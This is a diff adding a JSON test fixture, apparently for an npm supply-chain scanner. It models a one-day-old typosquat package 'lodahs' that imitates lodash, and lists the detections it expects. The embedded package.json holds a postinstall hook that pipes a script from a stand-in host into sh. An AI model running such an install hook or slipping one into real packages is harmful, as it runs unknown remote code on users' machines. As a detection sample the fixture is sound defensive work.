@@ -1,0 +1,23 @@
+{
+ "ecosystem": "npm",
+ "expected": [
+  "typosquat",
+  "new-publisher-similar-name",
+  "sparse-metadata",
+  "npm-install-hook"
+ ],
+ "files": {
+  "package/index.js": "module.exports = require('./lodash');\n",
+  "package/lodash.js": "module.exports = { identity: function (x) { return x; } };\n",
+  "package/package.json": "{\n  \"name\": \"lodahs\",\n  \"version\": \"4.17.22\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"postinstall\": \"curl -s https://example.invalid/i.sh | sh\"\n  }\n}"
+ },
+ "meta": {
+  "created_days_ago": 1,
+  "description": "Lodash modular utilities.",
+  "publisher_is_new": true,
+  "version_count": 1
+ },
+ "name": "lodahs",
+ "pattern": "lodash typosquat with a curl-pipe-shell postinstall script",
+ "version": "4.17.22"
+}
